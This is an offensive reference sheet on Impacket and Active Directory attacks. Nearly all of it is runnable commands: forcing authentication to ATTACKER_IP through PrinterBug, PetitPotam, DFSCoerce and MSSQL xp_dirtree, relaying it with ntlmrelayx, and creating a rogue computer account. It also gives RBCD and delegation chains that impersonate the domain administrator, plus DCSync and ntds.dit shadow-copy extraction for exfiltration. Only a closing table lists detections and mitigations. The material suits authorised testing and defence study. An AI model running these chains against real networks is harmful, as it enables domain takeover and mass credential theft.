# Impacket — Deep Reference

## NTLM Relay: Coercion Methods

Relay attacks require forcing a victim machine to authenticate to your listener. Multiple coercion primitives exist:

### PrinterBug (MS-RPRN SpoolerService)

```bash
# Trigger DC$ → ATTACKER_IP NTLM auth via printer spooler
# Requires: domain user creds, spooler running on target

# Check if spooler is running
rpcdump.py DOMAIN/user:pass@TARGET | grep -i spooler

# Trigger with impacket printerbug
python3 printerbug.py DOMAIN/user:pass@TARGET ATTACKER_IP

# or with dementor.py
python3 dementor.py -d DOMAIN -u user -p pass ATTACKER_IP TARGET
```

### PetitPotam (MS-EFSRPC)

```bash
# No creds required against unpatched targets (pre-Aug 2021)
python3 PetitPotam.py ATTACKER_IP TARGET_DC

# With creds (works on patched systems too via authenticated EFSRPC)
python3 PetitPotam.py -d DOMAIN -u user -p pass ATTACKER_IP TARGET
```

### DFSCoerce (MS-DFSNM)

```bash
# Alternative coercion when PetitPotam is patched
python3 dfscoerce.py -d DOMAIN -u user -p pass ATTACKER_IP TARGET
```

### Coercer (multi-method)

```bash
pip install coercer

# Test all coercion methods against target
coercer scan -t TARGET -u user -p pass -d DOMAIN

# Coerce to specific listener
coercer coerce -t TARGET -l ATTACKER_IP -u user -p pass -d DOMAIN

# Only try specific methods
coercer coerce -t TARGET -l ATTACKER_IP -u user -p pass -d DOMAIN --filter-method-name MS-RPRN
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -d DOMAIN -u user -p pass ATTACKER_IP TARGET
```

### MSSQL UNC Path Injection (xp_dirtree / xp_fileexist)

```bash
# When you have MSSQL access — trigger NTLM to listener via file path
mssqlclient.py DOMAIN/user:pass@TARGET
SQL> EXEC xp_dirtree '\\ATTACKER_IP\share'
SQL> EXEC xp_fileexist '\\ATTACKER_IP\share\file'

# Combine with ntlmrelayx listener
ntlmrelayx.py -t ldap://DC_IP -smb2support --add-computer EVIL$ EvilPass123
```

---

## NTLM Relay: Target Decision Tree

```
Relay target selection:
│
├── SMB signing DISABLED on target?
│   ├── YES → relay to SMB (secretsdump, command exec, file read/write)
│   └── NO  → cannot relay to SMB (signing enforced)
│
├── LDAP signing DISABLED or negotiated?
│   ├── YES → relay to LDAP (add computer, set RBCD, modify ACLs, dump LAPS)
│   └── NO  → LDAP relay blocked
│
├── ADCS HTTP enrollment available?
│   └── YES → relay to ADCS (ESC8) → get cert → PKINIT → NT hash
│
└── MSSQL available, relayed user has db_owner?
    └── YES → relay to MSSQL (xp_cmdshell execution)
```

```bash
# Check SMB signing on subnet
nmap -p 445 --script smb2-security-mode 192.168.0.0/24 -oG - | grep -i "signing: disabled"

# CrackMapExec bulk check
crackmapexec smb 192.168.0.0/24 --gen-relay-list no_signing.txt

# Check LDAP signing policy (from domain context)
ldapsearch -H ldap://DC_IP -x -b "CN=Default Domain Controllers Policy,CN=Policies,CN=System,DC=corp,DC=local" \
  "(objectClass=*)" ldapServerIntegrity 2>/dev/null
# ldapServerIntegrity=0 → None; 1 → Negotiate signing; 2 → Required
```

---

## NTLM Relay: ntlmrelayx SOCKS Mode Deep Dive

```bash
# Start relay with SOCKS
ntlmrelayx.py -t smb://TARGET -smb2support -socks

# When relay succeeds, SOCKS proxy opens at 127.0.0.1:1080
# List active SOCKS sessions (interactive prompt inside ntlmrelayx)
> socks

# Use with proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains secretsdump.py -no-pass DOMAIN/relayed_user@TARGET
proxychains smbclient.py DOMAIN/relayed_user@TARGET

# SOCKS remains open even after initial relay completes
# Session lasts until TCP idle timeout (~10 minutes typically)
```

---

## Kerberos Delegation: Protocol Internals

### S4U2Self (User-to-Self)

Service A requests a service ticket to itself on behalf of UserX, even if UserX never authenticates via Kerberos. Requires `TrustedToAuthForDelegation` flag (Protocol Transition).

```
Flow:
UserX → Service A (non-Kerberos auth, e.g., NTLM)
Service A → KDC: "Give me S4U2Self TGS for UserX to me"
KDC → Service A: TGS (UserX→ServiceA), with PAC
```

### S4U2Proxy (User-to-Proxy)

Service A uses the S4U2Self ticket to request a TGS for UserX to Service B. Requires constrained delegation config pointing to Service B (or RBCD on Service B).

```
Flow:
Service A → KDC: "Give me S4U2Proxy TGS for UserX to Service B" (evidence: S4U2Self TGS)
KDC → Service A: TGS (UserX→ServiceB), forwarded
Service A → Service B: presents TGS
```

### Full getST chain (impacket)

```bash
# Unconstrained delegation: EVIL$ can impersonate to ANY service
# Constrained: EVIL$ can only impersonate to listed SPNs
# RBCD: TARGET$ allows EVIL$ to impersonate to cifs/TARGET$

# RBCD full chain breakdown:
# Step 1: Create computer account (attacker-controlled)
addcomputer.py -computer-name EVIL$ -computer-pass EvilPass123 -dc-ip DC DOMAIN/user:pass

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$ → allow EVIL$
rbcd.py -action write -delegate-to TARGET$ -delegate-from EVIL$ DOMAIN/user:pass -dc-ip DC

# Step 3: Get TGT for EVIL$
getTGT.py DOMAIN/EVIL$ -dc-ip DC -hashes :$(python3 -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4', 'EvilPass123'.encode('utf-16-le')).digest()).decode())")

# Step 4: S4U2Self + S4U2Proxy via getST
export KRB5CCNAME=EVIL\$.ccache
getST.py DOMAIN/EVIL$ -spn cifs/TARGET.DOMAIN -impersonate administrator -dc-ip DC

# Step 5: Use resulting ccache
export KRB5CCNAME=administrator@cifs_TARGET.DOMAIN@DOMAIN.ccache
secretsdump.py -k -no-pass DOMAIN/administrator@TARGET.DOMAIN
```

---

## Constrained Delegation (S4U2Proxy Only) Abuse

```bash
# Identify: findDelegation shows "Constrained" for SVC_ACCOUNT
findDelegation.py DOMAIN/user:pass -dc-ip DC

# Constrained without Protocol Transition:
# SVC_ACCOUNT can only proxy if UserX authenticated to it via Kerberos first
# Attack: get SVC_ACCOUNT hash → getST impersonating admin

# Get TGT for SVC_ACCOUNT (via PTH or cracked pass)
getTGT.py DOMAIN/SVC_ACCOUNT -hashes :SVC_NTHASH -dc-ip DC

# S4U2Self → S4U2Proxy (impersonate admin to allowed SPN)
export KRB5CCNAME=SVC_ACCOUNT.ccache
getST.py DOMAIN/SVC_ACCOUNT -spn cifs/ALLOWED_TARGET -impersonate administrator -dc-ip DC
```

---

## Unconstrained Delegation Abuse

Machine with unconstrained delegation caches any TGT of users authenticating to it. Capture those TGTs via coercion.

```bash
# Step 1: Find unconstrained delegation machines
findDelegation.py DOMAIN/user:pass -dc-ip DC | grep -i "Unconstrained"

# Step 2: On compromised machine with unconstrained delegation
# Monitor for incoming TGTs (Rubeus monitor, or mimikatz sekurlsa)

# Step 3: Coerce DC to authenticate to compromised machine
python3 PetitPotam.py COMPROMISED_MACHINE_IP DC_IP

# Step 4: From compromised machine — extract DC$ TGT
# mimikatz: sekurlsa::tickets /export
# Then: convert .kirbi to ccache (kekeo, or impacket ticketConverter)

# Step 5: DCSync using DC machine ticket
export KRB5CCNAME=DC$.ccache
secretsdump.py -k -no-pass DOMAIN/DC$@DC_IP
```

---

## DCSync: Events and Alternatives

**DCSync generates:**
- Event 4662 (Object operation) on DC: "Control Access Right" with GUID `{1131f6aa-...}` (DS-Replication-Get-Changes)
- Source IP of attacker visible
- Monitoring via Microsoft Sentinel, Splunk, SIEM

**Alternatives to DCSync:**
```bash
# Shadow copy + NTDS extraction (file system, not replication protocol)
# On DC as SYSTEM:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
# Exfil and parse locally:
secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# Living-off-the-land: ntdsutil snapshot
ntdsutil "ac i ntds" "ifm" "create full C:\ntds_snapshot" quit quit
# Creates ntds.dit + SYSTEM/SECURITY in C:\ntds_snapshot\
```

---

## Kerberos Time Sync Requirement

Kerberos tolerates max 5-minute clock skew. If clocks diverge, KDC returns `KRB_AP_ERR_SKEW`.

```bash
# Check skew (Linux)
ntpdate -q DC_IP

# Sync clock to DC
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP

# Force sync ignoring NTP servers
sudo date -s "$(curl -s --head http://DC_IP | grep Date: | cut -d' ' -f2-7)"

# impacket handles this per-script:
# Most scripts accept -ts flag or detect skew
# If ticket fails: sync clock first
```

---

## Protocol Auth Downgrade Detection

| Scenario | Detection | Mitigation |
|---------|-----------|------------|
| NTLM relay | Event 4624 (NTLM type 3), unusual source IP | Require Kerberos (DisableNTLM GPO) |
| AS-REP roast | Event 4768 (no preauth flag) | Require preauth on all accounts |
| Kerberoast | Event 4769 (TGS for SPN), RC4 encryption requested | Enforce AES-only SPNs |
| DCSync | Event 4662 (replication rights used) | Restrict replication rights |
| S4U2Self abuse | Event 4769 (unusual S4U request) | Audit delegation configs |
| RBCD attack | Event 5136 (attribute modified) | Restrict computer account creation |
